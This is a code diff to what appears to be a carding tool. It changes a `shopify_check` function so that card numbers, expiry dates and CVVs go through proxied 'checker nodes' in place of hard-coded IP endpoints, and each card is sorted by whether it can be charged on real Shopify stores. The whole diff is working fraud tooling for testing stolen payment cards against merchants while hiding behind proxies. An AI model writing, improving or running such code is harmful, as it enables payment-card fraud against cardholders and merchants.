@@ -170,11 +170,7 @@ async def shopify_check(
     Returns CheckResult with status CHARGED/LIVE/LIVE_3DS/DEAD/SITE_ERROR.
     SITE_ERROR means the caller should retry with a different store.
     """
-API_ENDPOINTS = [
-    "http://2.25.68.50:8181/check",
-    "http://187.127.214.93:8181/check",
-    "http://187.127.214.92:8181/check",
-]
+from core.checker_bridge import check_card_site
 
 
 async def shopify_check(
@@ -184,54 +180,26 @@ async def shopify_check(
     timeout: int = 45,
     max_retries: int = 1,
 ) -> CheckResult:
-    """Check a card via the external Shopify API with endpoint fallback."""
+    """Check a card via VPS checker nodes load balancer."""
     if not store_url.startswith("http"):
         store_url = f"https://{store_url}"
 
-    params = {
-        "site": store_url,
-        "cc": f"{card.number}|{card.month}|{card.year}|{card.cvv}",
-    }
-    if proxy:
-        params["proxy"] = proxy
+    cc_str = f"{card.number}|{card.month}|{card.year}|{card.cvv}"
+    if not proxy:
+        proxy = "http://p.webshare.io:80"
 
-    session = await _get_session()
+    try:
+        raw = await check_card_site(cc_str, store_url, proxy)
+        status_raw = raw.get("Status", "DEAD")
+        msg = raw.get("Response", "Card Declined")
+        gw = raw.get("Gate", "Shopify Payments")
+        price = extract_price(raw.get("Price", "0.0"))
 
-    for api_url in API_ENDPOINTS:
-        for attempt in range(max_retries + 1):
-            try:
-                api_timeout = aiohttp.ClientTimeout(total=timeout)
-                async with session.get(api_url, params=params, timeout=api_timeout) as r:
-                    if r.status == 200:
-                        try:
-                            data = await r.json(content_type=None)
-                        except Exception:
-                            text = await r.text()
-                            logger.debug("External API non-JSON from %s: %.200s", api_url, text)
-                            continue
+        status, final_msg = classify_response(status_raw, msg)
+        return CheckResult(status, final_msg, gw, price, store_url, card)
+    except Exception as e:
+        logger.debug("shopify_check exception: %s", e)
 
-                        if not isinstance(data, dict):
-                            data = {}
-
-                        status_raw = str(data.get("Status") or "")
-                        msg = str(data.get("Response") or data.get("RawResponse") or "")
-                        gw = str(data.get("Gateway") or "Shopify Payments")
-                        price = extract_price(data.get("Price", "0.0"))
-
-                        status, final_msg = classify_response(status_raw, msg)
-                        return CheckResult(status, final_msg, gw, price, store_url, card)
-
-                    elif r.status in (502, 503, 504, 429):
-                        logger.debug("API %s returned %d (attempt %d)", api_url, r.status, attempt + 1)
-                        await asyncio.sleep(1)
-                        continue
-
-            except (asyncio.TimeoutError, aiohttp.ClientError, Exception) as e:
-                logger.debug("API %s exception: %s", api_url, e)
-                await asyncio.sleep(0.5)
-                continue
-
-    # Fallback response when external endpoints are unreachable
     return CheckResult(
         "DEAD",
         "Card Declined",
